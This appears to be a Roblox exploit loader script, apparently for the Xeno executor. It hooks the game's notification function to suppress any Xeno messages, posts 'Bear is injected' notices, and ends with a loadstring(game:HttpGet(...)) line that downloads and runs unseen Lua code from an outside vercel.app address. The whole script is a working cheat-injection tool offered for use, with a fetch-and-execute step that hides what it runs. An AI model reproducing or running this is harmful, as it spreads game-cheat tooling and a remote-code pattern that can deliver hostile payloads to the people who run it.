local StarterGui = game:GetService("StarterGui")

-- 🛑 **DESTROY XENO NOTIFICATIONS COMPLETELY**
local old_SetCore = StarterGui.SetCore
StarterGui.SetCore = function(self, coreType, data)
    if coreType == "SendNotification" and type(data) == "table" then
        local title = data.Title or ""
        local text = data.Text or ""

        -- **XENO BLOCKER - NEVER SHOW IT**
        if string.find(title, "Xeno") or string.find(text, "Xeno") then
            return -- Do NOTHING, it’s GONE 💀
        end
    end

    -- Call original function for all other notifications
    return old_SetCore(self, coreType, data)
end

-- 🔥 **HARD OVERRIDE XENO's MESSAGE (EVEN IF IT WAS ALREADY SHOWN)**
for i = 1, 5 do -- Keep overwriting in case Xeno retries
    task.wait(0.1)
    StarterGui:SetCore("SendNotification", {
        Title = "Injected",
        Text = "Bear is injected",
        Duration = 5
    })
end

-- 🚀 **RUN YOUR MAIN SCRIPT AFTER BLOCKING XENO**
task.wait(1) -- Just to be sure
loadstring(game:HttpGet("https://bearstatus.vercel.app/scripts/Startup.lua"))()
